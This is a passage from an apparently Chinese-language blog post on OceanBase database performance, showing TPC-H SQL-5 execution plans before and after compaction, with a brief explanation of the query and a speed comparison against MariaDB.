[lineitem.l_linestatus], [lineitem.l_quantity], [lineitem.l_extendedprice], [lineitem.l_discount], [lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount], [lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount <span class="operator">*</span> ? <span class="operator">+</span> lineitem.l_tax]), <span class="keyword">filter</span>([<span class="built_in">cast</span>(lineitem.l_shipDATE, DATETIME(<span class="number">-1</span>, <span class="number">-1</span>)) <span class="operator">&lt;=</span> ?]),</span><br><span class="line">      access([lineitem.l_shipDATE], [lineitem.l_returnflag], [lineitem.l_linestatus], [lineitem.l_quantity], [lineitem.l_extendedprice], [lineitem.l_discount], [lineitem.l_tax]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="SQL-5-执行计划">SQL-5 执行计划</h3>
<p>SQL-5 语句查询得到通过某个地区零件供货商而获得的收入（收入按sum(l_extendedprice * (1 -l_discount))计算）统计信息。<br>
可用于决定在给定的区域是否需要建立一个当地分配中心。<br>
该语句的特点是带有分组、排序、聚集操作并存的多表连接查询操作。<br>
此时OB的优点就突显出来了，相比于MariaDB，查询速度快了58倍多，从20多分钟级直接下降到30秒以内。</p>
<ul>
<li>一般情况下的执行计划：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR             <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST    <span class="operator">|</span></span><br><span class="line"><span class="comment">------------------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SORT                 <span class="operator">|</span>        <span class="operator">|</span><span class="number">26</span>       <span class="operator">|</span><span class="number">10173122</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span>       <span class="operator">|</span>        <span class="operator">|</span><span class="number">26</span>       <span class="operator">|</span><span class="number">10172990</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  HASH <span class="keyword">JOIN</span>          <span class="operator">|</span>        <span class="operator">|</span><span class="number">912787</span>   <span class="operator">|</span><span class="number">9824978</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">3</span> <span class="operator">|</span>   SUBPLAN SCAN      <span class="operator">|</span>VIEW1   <span class="operator">|</span><span class="number">10001</span>    <span class="operator">|</span><span class="number">170560</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">4</span> <span class="operator">|</span>    HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span>    <span class="operator">|</span>        <span class="operator">|</span><span class="number">10001</span>    <span class="operator">|</span><span class="number">169180</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">5</span> <span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN      <span class="operator">|</span>customer<span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">96116</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">6</span> <span class="operator">|</span>   HASH <span class="keyword">JOIN</span>         <span class="operator">|</span>        <span class="operator">|</span><span class="number">950230</span>   <span class="operator">|</span><span class="number">8654269</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">7</span> <span class="operator">|</span>    SUBPLAN SCAN     <span class="operator">|</span>VIEW2   <span class="operator">|</span><span class="number">10001</span>    <span class="operator">|</span><span class="number">1286589</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">8</span> <span class="operator">|</span>     HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span>   <span class="operator">|</span>        <span class="operator">|</span><span class="number">10001</span>    <span class="operator">|</span><span class="number">1285208</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">9</span> <span class="operator">|</span>      <span class="keyword">TABLE</span> SCAN     <span class="operator">|</span>orders  <span class="operator">|</span><span class="number">75000</span>    <span class="operator">|</span><span class="number">1245098</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">10</span><span class="operator">|</span>    HASH <span class="keyword">JOIN</span>        <span class="operator">|</span>        <span class="operator">|</span><span class="number">9696</span>     <span class="operator">|</span><span class="number">6786304</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">11</span><span class="operator">|</span>     HASH <span class="keyword">JOIN</span>       <span class="operator">|</span>        <span class="operator">|</span><span class="number">99</span>       <span class="operator">|</span><span class="number">22789</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">12</span><span class="operator">|</span>      HASH <span class="keyword">JOIN</span>      <span class="operator">|</span>        <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">126</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">13</span><span class="operator">|</span>       SUBPLAN SCAN  <span class="operator">|</span>VIEW6   <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">41</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">14</span><span class="operator">|</span>        HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">41</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">15</span><span class="operator">|</span>         <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>region  <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">40</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">16</span><span class="operator">|</span>       SUBPLAN SCAN  <span class="operator">|</span>VIEW5   <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">76</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">17</span><span class="operator">|</span>        HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">72</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">18</span><span class="operator">|</span>         <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>nation  <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">42</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">19</span><span class="operator">|</span>      SUBPLAN SCAN   <span class="operator">|</span>VIEW4   <span class="operator">|</span><span class="number">9992</span>     <span class="operator">|</span><span class="number">19323</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">20</span><span class="operator">|</span>       HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">|</span>        <span class="operator">|</span><span class="number">9992</span>     <span class="operator">|</span><span class="number">17943</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">21</span><span class="operator">|</span>        <span class="keyword">TABLE</span> SCAN   <span class="operator">|</span>supplier<span class="operator">|</span><span class="number">9992</span>     <span class="operator">|</span><span class="number">6402</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">22</span><span class="operator">|</span>     SUBPLAN SCAN    <span class="operator">|</span>VIEW3   <span class="operator">|</span><span class="number">10001</span>    <span class="operator">|</span><span class="number">6754192</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">23</span><span class="operator">|</span>      HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span>  <span class="operator">|</span>        <span class="operator">|</span><span class="number">10001</span>    <span class="operator">|</span><span class="number">6752812</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">24</span><span class="operator">|</span>       <span class="keyword">TABLE</span> SCAN    <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">6001215</span>  <span class="operator">|</span><span class="number">4108851</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([VIEW5.nation.n_name], [T_FUN_SUM(<span class="built_in">cast</span>(VIEW1.T_FUN_COUNT(<span class="operator">*</span>) <span class="operator">*</span> VIEW2.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW4.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW5.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW6.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)))]), <span class="keyword">filter</span>(nil), sort_keys([T_FUN_SUM(<span class="built_in">cast</span>(VIEW1.T_FUN_COUNT(<span class="operator">*</span>) <span class="operator">*</span> VIEW2.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW4.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW5.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW6.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))), <span class="keyword">DESC</span>])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([VIEW5.nation.n_name], [T_FUN_SUM(<span class="built_in">cast</span>(VIEW1.T_FUN_COUNT(<span class="operator">*</span>) <span class="operator">*</span> VIEW2.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW4.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW5.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW6.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)))]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([VIEW5.nation.n_name]), agg_func([T_FUN_SUM(<span class="built_in">cast</span>(VIEW1.T_FUN_COUNT(<span class="operator">*</span>) <span class="operator">*</span> VIEW2.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW4.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW5.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW6.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)))])</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([VIEW5.nation.n_name], [<span class="built_in">cast</span>(VIEW1.T_FUN_COUNT(<span class="operator">*</span>) <span class="operator">*</span> VIEW2.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW4.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW5.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW6.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([VIEW1.customer.c_custkey <span class="operator">=</span> VIEW2.orders.o_custkey], [VIEW1.customer.c_nationkey <span class="operator">=</span> VIEW4.supplier.s_nationkey]), other_conds(nil)</span><br><span class="line">  <span class="number">3</span> <span class="operator">-</span> output([VIEW1.customer.c_custkey], [VIEW1.customer.c_nationkey], [VIEW1.T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW1.customer.c_custkey], [VIEW1.customer.c_nationkey], [VIEW1.T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">4</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_nationkey], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([customer.c_custkey], [customer.c_nationkey]), agg_func([T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">5</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([customer.c_custkey], [customer.c_nationkey]), partitions(p0)</span><br><span class="line">  <span class="number">6</span> <span class="operator">-</span> output([VIEW5.nation.n_name], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [VIEW4.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW5.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW6.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW2.orders.o_custkey], [VIEW4.supplier.s_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([VIEW3.lineitem.l_orderkey <span class="operator">=</span> VIEW2.orders.o_orderkey]), other_conds(nil)</span><br><span class="line">  <span class="number">7</span> <span class="operator">-</span> output([VIEW2.orders.o_custkey], [VIEW2.orders.o_orderkey], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW2.orders.o_custkey], [VIEW2.orders.o_orderkey], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">8</span> <span class="operator">-</span> output([orders.o_custkey], [orders.o_orderkey], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([orders.o_custkey], [orders.o_orderkey]), agg_func([T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">9</span> <span class="operator">-</span> output([orders.o_custkey], [orders.o_orderkey]), <span class="keyword">filter</span>([orders.o_orderDATE <span class="operator">&gt;=</span> <span class="string">&#x27;1996-01-01&#x27;</span>], [orders.o_orderDATE <span class="operator">&lt;</span> ?]),</span><br><span class="line">      access([orders.o_custkey], [orders.o_orderkey], [orders.o_orderDATE]), partitions(p0)</span><br><span class="line">  <span class="number">10</span> <span class="operator">-</span> output([VIEW5.nation.n_name], [VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [VIEW4.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW5.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW6.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW4.supplier.s_nationkey], [VIEW3.lineitem.l_orderkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([VIEW3.lineitem.l_suppkey <span class="operator">=</span> VIEW4.supplier.s_suppkey]), other_conds(nil)</span><br><span class="line">  <span class="number">11</span> <span class="operator">-</span> output([VIEW5.nation.n_name], [VIEW4.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW5.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW6.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW4.supplier.s_nationkey], [VIEW4.supplier.s_suppkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([VIEW4.supplier.s_nationkey <span class="operator">=</span> VIEW5.nation.n_nationkey]), other_conds(nil)</span><br><span class="line">  <span class="number">12</span> <span class="operator">-</span> output([VIEW5.nation.n_name], [VIEW5.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW6.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW5.nation.n_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([VIEW5.nation.n_regionkey <span class="operator">=</span> VIEW6.region.r_regionkey]), other_conds(nil)</span><br><span class="line">  <span class="number">13</span> <span class="operator">-</span> output([VIEW6.region.r_regionkey], [VIEW6.T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW6.region.r_regionkey], [VIEW6.T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">14</span> <span class="operator">-</span> output([region.r_regionkey], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([region.r_regionkey]), agg_func([T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">15</span> <span class="operator">-</span> output([region.r_regionkey]), <span class="keyword">filter</span>([region.r_name <span class="operator">=</span> <span class="string">&#x27;EUROPE&#x27;</span>]),</span><br><span class="line">      access([region.r_regionkey], [region.r_name]), partitions(p0)</span><br><span class="line">  <span class="number">16</span> <span class="operator">-</span> output([VIEW5.nation.n_nationkey], [VIEW5.nation.n_regionkey], [VIEW5.nation.n_name], [VIEW5.T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW5.nation.n_nationkey], [VIEW5.nation.n_regionkey], [VIEW5.nation.n_name], [VIEW5.T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">17</span> <span class="operator">-</span> output([nation.n_nationkey], [nation.n_regionkey], [nation.n_name], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([nation.n_nationkey], [nation.n_regionkey], [nation.n_name]), agg_func([T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">18</span> <span class="operator">-</span> output([nation.n_nationkey], [nation.n_regionkey], [nation.n_name]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([nation.n_nationkey], [nation.n_regionkey], [nation.n_name]), partitions(p0)</span><br><span class="line">  <span class="number">19</span> <span class="operator">-</span> output([VIEW4.supplier.s_suppkey], [VIEW4.supplier.s_nationkey], [VIEW4.T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW4.supplier.s_suppkey], [VIEW4.supplier.s_nationkey], [VIEW4.T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">20</span> <span class="operator">-</span> output([supplier.s_suppkey], [supplier.s_nationkey], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([supplier.s_suppkey], [supplier.s_nationkey]), agg_func([T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">21</span> <span class="operator">-</span> output([supplier.s_suppkey], [supplier.s_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([supplier.s_suppkey], [supplier.s_nationkey]), partitions(p0)</span><br><span class="line">  <span class="number">22</span> <span class="operator">-</span> output([VIEW3.lineitem.l_orderkey], [VIEW3.lineitem.l_suppkey], [VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW3.lineitem.l_orderkey], [VIEW3.lineitem.l_suppkey], [VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)])</span><br><span class="line">  <span class="number">23</span> <span class="operator">-</span> output([lineitem.l_orderkey], [lineitem.l_suppkey], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([lineitem.l_orderkey], [lineitem.l_suppkey]), agg_func([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)])</span><br><span class="line">  <span class="number">24</span> <span class="operator">-</span> output([lineitem.l_orderkey], [lineitem.l_suppkey], [lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([lineitem.l_orderkey], [lineitem.l_suppkey], [lineitem.l_extendedprice], [lineitem.l_discount]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.039</span> sec)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>转储合并后的执行计划：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR         <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">-------------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SORT             <span class="operator">|</span>        <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">6968243</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span>   <span class="operator">|</span>        <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">6968114</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  HASH <span class="keyword">JOIN</span>      <span class="operator">|</span>        <span class="operator">|</span><span class="number">7348</span>     <span class="operator">|</span><span class="number">6965295</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">3</span> <span class="operator">|</span>   <span class="keyword">TABLE</span> SCAN    <span class="operator">|</span>region  <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">40</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">4</span> <span class="operator">|</span>   HASH <span class="keyword">JOIN</span>     <span class="operator">|</span>      